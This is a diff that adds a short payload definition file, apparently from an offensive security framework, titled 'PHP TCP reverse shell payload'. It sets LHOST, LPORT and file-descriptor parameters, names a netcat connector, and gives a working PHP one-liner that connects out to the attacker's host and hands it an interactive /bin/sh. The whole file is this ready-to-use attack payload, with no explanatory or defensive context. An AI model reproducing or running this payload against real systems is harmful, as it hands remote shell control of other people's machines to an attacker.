@@ -1,0 +1,5 @@
+title=PHP TCP reverse shell payload
+info=PARAM1=>fd, start with 3 and if not works try 4, 5, 6...
+required_opts=LHOST;LPORT;PARAM1
+connector=reverse_tcp_netcat
+payload=/usr/bin/env php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&PARAM1 >&PARAM1 2>&PARAM1");'
